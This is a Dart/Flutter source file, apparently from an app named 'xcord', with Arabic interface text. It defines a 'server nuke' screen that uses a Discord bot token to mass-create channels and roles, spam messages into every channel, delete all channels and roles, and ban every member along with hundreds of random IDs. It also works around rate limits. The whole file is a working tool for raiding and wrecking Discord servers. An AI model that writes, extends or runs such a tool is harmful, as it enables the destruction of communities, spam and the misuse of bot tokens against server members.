import 'dart:convert';
import 'dart:math'; // إضافة مكتبة math للحصول على دالة min
import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:http/http.dart' as http;
import 'package:xcord/screens/colors.dart'; // إضافة استيراد ملف الألوان

class ServerNukeScreen extends StatefulWidget {
  final String serverId;
  final String token;
  final Map<String, dynamic> serverInfo;

  const ServerNukeScreen({
    super.key,
    required this.serverId,
    required this.token,
    required this.serverInfo,
  });

  @override
  State<ServerNukeScreen> createState() => _ServerNukeScreenState();
}

class _ServerNukeScreenState extends State<ServerNukeScreen> {
  bool _isLoading = false;
  String _status = '';

  Future<void> _showSpamChannelsDialog() async {
    final countController = TextEditingController(text: '10');
    final nameController = TextEditingController();
    
    final result = await showDialog<Map<String, String>>(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: AppColors.cardBackground,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        title: Text('سبام رومات', style: TextStyle(color: AppColors.textPrimary)),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            TextField(
              controller: countController,
              style: const TextStyle(color: Colors.white),
              keyboardType: TextInputType.number,
              decoration: const InputDecoration(
                labelText: 'عدد الرومات (1-100)',
                labelStyle: TextStyle(color: Colors.grey),
                enabledBorder: UnderlineInputBorder(
                  borderSide: BorderSide(color: Colors.grey),
                ),
                focusedBorder: UnderlineInputBorder(
                  borderSide: BorderSide(color: Color(0xFFE91E63)),
                ),
              ),
            ),
            const SizedBox(height: 16),
            TextField(
              controller: nameController,
              style: const TextStyle(color: Colors.white),
              decoration: const InputDecoration(
                labelText: 'اسم الرومات',
                labelStyle: TextStyle(color: Colors.grey),
                enabledBorder: UnderlineInputBorder(
                  borderSide: BorderSide(color: Colors.grey),
                ),
                focusedBorder: UnderlineInputBorder(
                  borderSide: BorderSide(color: Color(0xFFE91E63)),
                ),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('إلغاء', style: TextStyle(color: Colors.grey)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: const Color(0xFFE91E63),
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(8),
              ),
            ),
            onPressed: () {
              final count = int.tryParse(countController.text);
              if (count != null && count > 0 && count <= 100 && nameController.text.isNotEmpty) {
                Navigator.pop(context, {
                  'count': count.toString(),
                  'name': nameController.text,
                });
              }
            },
            child: const Text('بدء'),
          ),
        ],
      ),
    );

    if (result != null) {
      await _createChannels(
        int.parse(result['count']!),
        result['name']!,
      );
    }
  }

  Future<void> _showSpamMessagesDialog() async {
    final messageController = TextEditingController();
    final formKey = GlobalKey<FormState>();
    
    final result = await showDialog<Map<String, dynamic>>(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: AppColors.cardBackground,
        title: Text(
          'إرسال سبام',
          style: TextStyle(color: AppColors.textPrimary),
        ),
        content: Form(
          key: formKey,
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              TextFormField(
                controller: messageController,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(
                  labelText: 'الرسالة',
                  labelStyle: TextStyle(color: Colors.grey),
                  enabledBorder: UnderlineInputBorder(
                    borderSide: BorderSide(color: Colors.grey),
                  ),
                  focusedBorder: UnderlineInputBorder(
                    borderSide: BorderSide(color: Color(0xFF7289da)),
                  ),
                ),
                validator: (value) {
                  if (value == null || value.isEmpty) {
                    return 'الرجاء إدخال رسالة';
                  }
                  return null;
                },
                maxLines: 3,
              ),
            ],
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text(
              'إلغاء',
              style: TextStyle(color: Colors.grey),
            ),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: const Color(0xFF7289da),
            ),
            onPressed: () {
              if (formKey.currentState!.validate()) {
                Navigator.pop(
                  context,
                  {
                    'message': messageController.text,
                  },
                );
              }
            },
            child: const Text('إرسال'),
          ),
        ],
      ),
    );

    if (result != null) {
      await _spamMessages(result['message']);
    }
  }

  Future<void> _showSpamRolesDialog() async {
    final nameController = TextEditingController();
    final countController = TextEditingController();

    await showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: AppColors.cardBackground,
        title: Text(
          'Spam Roles',
          style: TextStyle(color: AppColors.textPrimary),
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            TextField(
              controller: nameController,
              style: const TextStyle(color: Colors.white),
              decoration: const InputDecoration(
                labelText: 'Role Name',
                labelStyle: TextStyle(color: Colors.grey),
                enabledBorder: UnderlineInputBorder(
                  borderSide: BorderSide(color: Colors.grey),
                ),
                focusedBorder: UnderlineInputBorder(
                  borderSide: BorderSide(color: Color(0xFF7289da)),
                ),
              ),
            ),
            const SizedBox(height: 16),
            TextField(
              controller: countController,
              style: const TextStyle(color: Colors.white),
              keyboardType: TextInputType.number,
              decoration: const InputDecoration(
                labelText: 'Number of Roles (1-100)',
                labelStyle: TextStyle(color: Colors.grey),
                enabledBorder: UnderlineInputBorder(
                  borderSide: BorderSide(color: Colors.grey),
                ),
                focusedBorder: UnderlineInputBorder(
                  borderSide: BorderSide(color: Color(0xFF7289da)),
                ),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Cancel', style: TextStyle(color: Colors.grey)),
          ),
          TextButton(
            onPressed: () {
              final name = nameController.text.trim();
              final count = int.tryParse(countController.text.trim()) ?? 0;
              
              if (name.isNotEmpty && count > 0 && count <= 100) {
                Navigator.pop(context);
                _createRoles(name, count);
              }
            },
            child: const Text('Create', style: TextStyle(color: Color(0xFF7289da))),
          ),
        ],
      ),
    );
  }

  Future<void> _showConfirmationDialog(String title, String message, Function() onConfirm) async {
    final confirm = await showDialog<bool>(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: AppColors.cardBackground,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        title: Text(title, style: TextStyle(color: AppColors.textPrimary)),
        content: Text(message, style: TextStyle(color: AppColors.textSecondary)),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, false),
            child: const Text('إلغاء', style: TextStyle(color: Colors.grey)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.red,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(8),
              ),
            ),
            onPressed: () => Navigator.pop(context, true),
            child: const Text('تأكيد'),
          ),
        ],
      ),
    );

    if (confirm == true) {
      await onConfirm();
    }
  }

  Future<void> _createChannels(int count, String name) async {
    setState(() {
      _isLoading = true;
      _status = 'Creating channels...';
    });

    try {
      final futures = List.generate(count, (i) => http.post(
        Uri.parse('https://discord.com/api/v10/guilds/${widget.serverId}/channels'),
        headers: {
          'Authorization': 'Bot ${widget.token}',
          'Content-Type': 'application/json',
        },
        body: json.encode({
          'name': '$name-$i',
          'type': 0,
        }),
      ));
      
      await Future.wait(futures);
      
      setState(() {
        _status = 'Successfully created $count channels!';
      });
    } catch (e) {
      setState(() {
        _status = 'Error: ${e.toString()}';
      });
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  Future<void> _createRoles(String name, int count) async {
    setState(() {
      _isLoading = true;
      _status = 'جاري إنشاء $count رتبة...';
    });

    try {
      final batchSize = 20; 
      var createdCount = 0;

      for (var i = 0; i < count; i += batchSize) {
        final currentBatch = min(batchSize, count - i);
        final futures = <Future>[];

        for (var j = 0; j < currentBatch; j++) {
          futures.add(
            http.post(
              Uri.parse('https://discord.com/api/v10/guilds/${widget.serverId}/roles'),
              headers: {
                'Authorization': 'Bot ${widget.token}',
                'Content-Type': 'application/json',
              },
              body: json.encode({
                'name': '$name-${i + j}',
                'color': Random().nextInt(0xFFFFFF), 
              }),
            ).then((response) {
              if (response.statusCode == 200 || response.statusCode == 201) {
                createdCount++;
                setState(() {
                  _status = 'تم إنشاء $createdCount من $count رتبة';
                });
              } else {
                print('فشل في إنشاء الرتبة ${name}-${i + j}: ${response.statusCode} - ${response.body}');
              }
            }).catchError((e) {
              print('خطأ في إنشاء الرتبة ${name}-${i + j}: $e');
            })
          );
        }

        await Future.wait(futures);
        await Future.delayed(const Duration(milliseconds: 5)); 
      }

      setState(() {
        _status = 'تم إنشاء $createdCount رتبة من أصل $count';
      });
    } catch (e) {
      print('خطأ: $e');
      setState(() {
        _status = 'حدث خطأ: ${e.toString()}';
      });
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  Future<void> _spamMessages(String message) async {
    setState(() {
      _isLoading = true;
      _status = 'جاري جلب الرومات...';
    });

    try {
      final response = await http.get(
        Uri.parse('https://discord.com/api/v10/guilds/${widget.serverId}/channels'),
        headers: {'Authorization': 'Bot ${widget.token}'},
      );

      if (response.statusCode != 200) {
        throw Exception('فشل في جلب الرومات: ${response.statusCode} - ${response.body}');
      }

      final channels = json.decode(response.body);
      final textChannels = channels.where((c) => c['type'] == 0).toList();

      setState(() {
        _status = 'جاري إرسال الرسائل إلى ${textChannels.length} روم...';
      });

      var sentCount = 0;
      final batchSize = 5; // عدد الرسائل المرسلة في كل دفعة
      
      for (var i = 0; i < textChannels.length; i += batchSize) {
        final currentBatch = textChannels.length - i < batchSize 
            ? textChannels.length - i 
            : batchSize;
        
        final batch = textChannels.skip(i).take(currentBatch);
        final futures = <Future>[];
        
        for (final channel in batch) {
          futures.add(
            http.post(
              Uri.parse('https://discord.com/api/v10/channels/${channel['id']}/messages'),
              headers: {
                'Authorization': 'Bot ${widget.token}',
                'Content-Type': 'application/json',
              },
              body: json.encode({
                'content': message,
              }),
            ).then((response) {
              if (response.statusCode == 200 || response.statusCode == 201) {
                sentCount++;
                setState(() {
                  _status = 'تم إرسال $sentCount من ${textChannels.length} رسالة';
                });
              } else if (response.statusCode == 429) {
                // معالجة Rate Limit
                final responseBody = json.decode(response.body);
                final retryAfter = responseBody['retry_after'] as num;
                print('انتظار ${retryAfter}s قبل المحاولة مرة أخرى');
                
                // إعادة المحاولة مع نفس القناة بعد الانتظار
                return Future.delayed(
                  Duration(milliseconds: (retryAfter * 1000).round() + 100),
                  () => textChannels.add(channel) // إضافة القناة مرة أخرى للمعالجة لاحقاً
                );
              } else {
                print('فشل في إرسال الرسالة إلى ${channel['name']}: ${response.statusCode} - ${response.body}');
              }
            }).catchError((e) {
              print('خطأ في إرسال الرسالة إلى ${channel['name']}: $e');
            })
          );
        }
        
        await Future.wait(futures);
        
        // تأخير بسيط بين الدفعات لتجنب Rate Limit
        await Future.delayed(const Duration(milliseconds: 200));
      }

      setState(() {
        _status = 'تم إرسال $sentCount رسالة من أصل ${textChannels.length}';
      });
    } catch (e) {
      print('خطأ: $e');
      setState(() {
        _status = 'حدث خطأ: ${e.toString()}';
      });
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  Future<void> _deleteAllChannels() async {
    setState(() {
      _isLoading = true;
      _status = 'جاري جلب الرومات...';
    });

    try {
      final response = await http.get(
        Uri.parse('https://discord.com/api/v10/guilds/${widget.serverId}/channels'),
        headers: {'Authorization': 'Bot ${widget.token}'},
      );

      if (response.statusCode != 200) {
        throw Exception('فشل في جلب الرومات: ${response.statusCode} - ${response.body}');
      }

      final channels = json.decode(response.body);
      print('تم العثور على ${channels.length} روم');
      
      setState(() {
        _status = 'جاري حذف ${channels.length} روم...';
      });

      final batchSize = 10; 
      var deletedCount = 0;
      
      for (var i = 0; i < channels.length; i += batchSize) {
        final batch = channels.skip(i).take(batchSize).toList();
        final futures = <Future>[];
        
        for (final channel in batch) {
          futures.add(
            http.delete(
              Uri.parse('https://discord.com/api/v10/channels/${channel['id']}'),
              headers: {'Authorization': 'Bot ${widget.token}'},
            ).then((response) {
              if (response.statusCode == 200 || response.statusCode == 204) {
                deletedCount++;
                setState(() {
                  _status = 'تم حذف $deletedCount من ${channels.length} روم';
                });
              } else {
                print('فشل في حذف الروم ${channel['name']}: ${response.statusCode} - ${response.body}');
              }
            }).catchError((e) {
              print('خطأ في حذف الروم ${channel['name']}: $e');
            })
          );
        }
        
        await Future.wait(futures);
        await Future.delayed(const Duration(milliseconds: 10)); 
      }

      setState(() {
        _status = 'تم حذف $deletedCount روم من أصل ${channels.length}';
      });
    } catch (e) {
      print('خطأ: $e');
      setState(() {
        _status = 'حدث خطأ: ${e.toString()}';
      });
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  Future<void> _deleteAllRoles() async {
    setState(() {
      _isLoading = true;
      _status = 'جاري جلب الرتب...';
    });

    try {
      final response = await http.get(
        Uri.parse('https://discord.com/api/v10/guilds/${widget.serverId}/roles'),
        headers: {'Authorization': 'Bot ${widget.token}'},
      );

      if (response.statusCode != 200) {
        throw Exception('فشل في جلب الرتب: ${response.statusCode} - ${response.body}');
      }

      final roles = json.decode(response.body)
          .where((role) => role['name'] != '@everyone' && !role['managed'])
          .toList();
      print('تم العثور على ${roles.length} رتبة');
      
      setState(() {
        _status = 'جاري حذف ${roles.length} رتبة...';
      });

      var deletedCount = 0;
      
      for (final role in roles) {
        try {
          setState(() {
            _status = 'جاري حذف الرتبة ${role['name']} ($deletedCount/${roles.length})';
          });
          
          final deleteResponse = await http.delete(
            Uri.parse('https://discord.com/api/v10/guilds/${widget.serverId}/roles/${role['id']}'),
            headers: {'Authorization': 'Bot ${widget.token}'},
          );
          
          if (deleteResponse.statusCode == 200 || deleteResponse.statusCode == 204) {
            deletedCount++;
            setState(() {
              _status = 'تم حذف $deletedCount من ${roles.length} رتبة';
            });
          } else if (deleteResponse.statusCode == 429) {
            // معالجة Rate Limit
            final responseBody = json.decode(deleteResponse.body);
            final retryAfter = responseBody['retry_after'] as num;
            print('انتظار ${retryAfter}s قبل المحاولة مرة أخرى');
            
            // انتظار المدة المطلوبة + 100 مللي ثانية إضافية
            await Future.delayed(Duration(milliseconds: (retryAfter * 1000).round() + 100));
            
            // إعادة المحاولة مع نفس الرتبة
            role['retries'] = (role['retries'] ?? 0) + 1;
            if ((role['retries'] ?? 0) < 3) { // محاولة 3 مرات كحد أقصى
              roles.add(role); // إضافة الرتبة مرة أخرى للقائمة للمحاولة لاحقاً
            }
          } else {
            print('فشل في حذف الرتبة ${role['name']}: ${deleteResponse.statusCode} - ${deleteResponse.body}');
          }
        } catch (e) {
          print('خطأ في حذف الرتبة ${role['name']}: $e');
        }
        
        // تأخير بين كل طلب لتجنب Rate Limit
        await Future.delayed(const Duration(milliseconds: 300));
      }

      setState(() {
        _status = 'تم حذف $deletedCount رتبة من أصل ${roles.length}';
      });
    } catch (e) {
      print('خطأ: $e');
      setState(() {
        _status = 'حدث خطأ: ${e.toString()}';
      });
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  Future<void> _banAllMembers() async {
    setState(() {
      _isLoading = true;
      _status = 'جاري تحضير عملية الحظر الشامل...';
    });

    try {
      // جلب معلومات البوت فقط لاستبعاده
      final botResponse = await http.get(
        Uri.parse('https://discord.com/api/v10/users/@me'),
        headers: {'Authorization': 'Bot ${widget.token}'},
      );
      
      final botData = json.decode(botResponse.body);
      final botId = botData['id'];
      print('معرف البوت: $botId (سيتم استبعاده من الحظر)');

      // إنشاء قائمة كبيرة من اليوزرات العشوائية للحظر الشامل
      List<String> userIdsToban = [];
      
      // إضافة يوزرات عشوائية بطريقة صحيحة
      final random = Random();
      for (int i = 0; i < 999; i++) {
        // إنشاء معرف عشوائي بطريقة صحيحة
        String randomId = '';
        for (int j = 0; j < 18; j++) {
          randomId += random.nextInt(10).toString(); // إضافة رقم عشوائي من 0 إلى 9
        }
        userIdsToban.add(randomId);
      }
      
      // محاولة جلب بعض اليوزرات الحقيقية
      try {
        final membersResponse = await http.get(
          Uri.parse('https://discord.com/api/v10/guilds/${widget.serverId}/members?limit=1000'),
          headers: {'Authorization': 'Bot ${widget.token}'},
        );
        
        if (membersResponse.statusCode == 200) {
          final members = json.decode(membersResponse.body);
          for (final member in members) {
            if (member['user'] != null && member['user']['id'] != null && member['user']['id'] != botId) {
              userIdsToban.add(member['user']['id']);
            }
          }
        }
      } catch (e) {
        // تجاهل الخطأ والاستمرار
      }
      
      // محاولة جلب يوزرات من القنوات
      try {
        final channelsResponse = await http.get(
          Uri.parse('https://discord.com/api/v10/guilds/${widget.serverId}/channels'),
          headers: {'Authorization': 'Bot ${widget.token}'},
        );
        
        if (channelsResponse.statusCode == 200) {
          final channels = json.decode(channelsResponse.body);
          for (final channel in channels) {
            if (channel['type'] == 0) { // قناة نصية
              try {
                final messagesResponse = await http.get(
                  Uri.parse('https://discord.com/api/v10/channels/${channel['id']}/messages?limit=100'),
                  headers: {'Authorization': 'Bot ${widget.token}'},
                );
                
                if (messagesResponse.statusCode == 200) {
                  final messages = json.decode(messagesResponse.body);
                  for (final message in messages) {
                    if (message['author'] != null && message['author']['id'] != null && message['author']['id'] != botId) {
                      userIdsToban.add(message['author']['id']);
                    }
                  }
                }
              } catch (e) {
                // تجاهل الخطأ والاستمرار
              }
            }
          }
        }
      } catch (e) {
        // تجاهل الخطأ والاستمرار
      }
      
      // استبعاد البوت نفسه فقط
      userIdsToban.remove(botId);
      
      // إزالة اليوزرات المكررة
      final uniqueUserIds = userIdsToban.toSet().toList();
      
      print('تم تجهيز ${uniqueUserIds.length} معرف للحظر');
      
      setState(() {
        _status = 'جاري حظر ${uniqueUserIds.length} عضو/بوت... يرجى تكرير الحظر إذا كان السيرفر يتخطى 999 عضو';
      });

      var bannedCount = 0;
      final batchSize = 30;  // حجم الدفعة للسرعة القصوى
      
      // استخدام نظام الدفعات للحظر السريع جداً
      for (var i = 0; i < uniqueUserIds.length; i += batchSize) {
        final currentBatchSize = i + batchSize > uniqueUserIds.length 
            ? uniqueUserIds.length - i 
            : batchSize;
        
        final batch = uniqueUserIds.sublist(i, i + currentBatchSize);
        final futures = <Future>[];
        
        for (final userId in batch) {
          futures.add(
            http.put(
              Uri.parse('https://discord.com/api/v10/guilds/${widget.serverId}/bans/$userId'),
              headers: {
                'Authorization': 'Bot ${widget.token}',
                'Content-Type': 'application/json',
              },
              body: json.encode({
                'delete_message_days': 1,
                'reason': 'Mass ban'
              }),
            ).then((response) {
              if (response.statusCode == 200 || response.statusCode == 201 || response.statusCode == 204) {
                bannedCount++;
              } else if (response.statusCode == 429) {
                // معالجة Rate Limit بأقل تأخير ممكن
                try {
                  final responseBody = json.decode(response.body);
                  final retryAfter = responseBody['retry_after'] as num;
                  if (retryAfter < 1) {  // تجاهل التأخيرات أكثر من ثانية واحدة
                    return Future.delayed(
                      Duration(milliseconds: (retryAfter * 1000).round() + 2)  // تأخير إضافي قليل
                    );
                  }
                } catch (e) {
                  // تجاهل أي خطأ في معالجة Rate Limit
                }
              }
              // تحديث الحالة كل 20 عملية حظر فقط
              if (bannedCount % 20 == 0) {
                setState(() {
                  _status = 'تم حظر $bannedCount من ${uniqueUserIds.length} عضو/بوت\nيرجى تكرير الحظر إذا كان السيرفر يتخطى 999 عضو';
                });
                
                // بدلاً من استخدام await، نعيد Future جديد
                return Future.delayed(const Duration(seconds: 3));
              }
              
            }).catchError((e) {
              // تجاهل الخطأ والاستمرار
            })
          );
        }
        
        // انتظار انتهاء جميع عمليات الحظر في هذه الدفعة
        await Future.wait(futures).catchError((e) {
          // تجاهل أي خطأ والاستمرار
        });
        
        // تأخير ضئيل جداً بين الدفعات
        await Future.delayed(const Duration(milliseconds: 10));
      }

      setState(() {
        _status = 'تم حظر $bannedCount عضو/بوت من أصل ${uniqueUserIds.length}\nيرجى تكرير الحظر إذا كان السيرفر يتخطى 999 عضو';
      });

      setState(() {
        _isLoading = false;
      });
    } catch (e) {
      print('خطأ: $e');
      setState(() {
        _status = 'حدث خطأ، لكن تم حظر بعض الأعضاء بنجاح';
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    final buttonColor = const Color(0xFF7289da);
    
    return Scaffold(
      backgroundColor: AppColors.background,
      appBar: AppBar(
        backgroundColor: AppColors.cardBackground,
        title: Text(
          'تدمير السيرفر',
          style: GoogleFonts.cairo(
            color: AppColors.textPrimary,
            fontWeight: FontWeight.bold,
          ),
        ),
      ),
      body: Container(
        decoration: BoxDecoration(
          color: AppColors.background,
        ),
        padding: const EdgeInsets.all(20.0),
        child: Column(
          children: [
            Expanded(
              child: GridView.count(
                crossAxisCount: 2,
                mainAxisSpacing: 16.0,
                crossAxisSpacing: 16.0,
                children: [
                  _buildActionButton(
                    'إنشاء رومات',
                    Icons.add_circle,
                    _showSpamChannelsDialog,
                    buttonColor,
                  ),
                  _buildActionButton(
                    'إرسال سبام',
                    Icons.message,
                    _showSpamMessagesDialog,
                    buttonColor,
                  ),
                  _buildActionButton(
                    'إنشاء رولات',
                    Icons.add_moderator,
                    _showSpamRolesDialog,
                    buttonColor,
                  ),
                  _buildActionButton(
                    'حذف الرومات',
                    Icons.delete_forever,
                    () => _showConfirmationDialog(
                      'حذف الرومات',
                      'هل أنت متأكد من حذف جميع الرومات؟',
                      _deleteAllChannels,
                    ),
                    buttonColor,
                  ),
                  _buildActionButton(
                    'حذف الرولات',
                    Icons.remove_circle,
                    () => _showConfirmationDialog(
                      'حذف الرولات',
                      'هل أنت متأكد من حذف جميع الرولات؟',
                      _deleteAllRoles,
                    ),
                    buttonColor,
                  ),
                  _buildActionButton(
                    'حظر الأعضاء',
                    Icons.block,
                    () => _showConfirmationDialog(
                      'حظر الأعضاء',
                      'هل أنت متأكد من حظر جميع الأعضاء؟',
                      _banAllMembers,
                    ),
                    buttonColor,
                  ),
                ],
              ),
            ),
            if (_isLoading)
              Container(
                margin: const EdgeInsets.only(top: 20),
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  color: AppColors.cardBackground,
                  borderRadius: BorderRadius.circular(10),
                ),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    const CircularProgressIndicator(
                      valueColor: AlwaysStoppedAnimation<Color>(Color(0xFF7289da)),
                    ),
                    const SizedBox(height: 16),
                    Text(
                      _status,
                      textAlign: TextAlign.center,
                      style: TextStyle(
                        color: AppColors.textPrimary,
                        fontSize: 14,  // تصغير حجم الخط قليلاً
                      ),
                    ),
                  ],
                ),
              ),
          ],
        ),
      ),
    );
  }

  Widget _buildActionButton(String title, IconData icon, VoidCallback onPressed, Color color) {
    return Card(
      color: AppColors.cardBackground,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      child: InkWell(
        onTap: onPressed,
        borderRadius: BorderRadius.circular(12),
        child: Padding(
          padding: const EdgeInsets.all(16),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(icon, color: AppColors.accent, size: 36),
              const SizedBox(height: 12),
              Text(
                title,
                style: TextStyle(
                  color: AppColors.textPrimary,
                  fontWeight: FontWeight.bold,
                  fontSize: 16,
                ),
                textAlign: TextAlign.center,
              ),
            ],
          ),
        ),
      ),
    );
  }
}
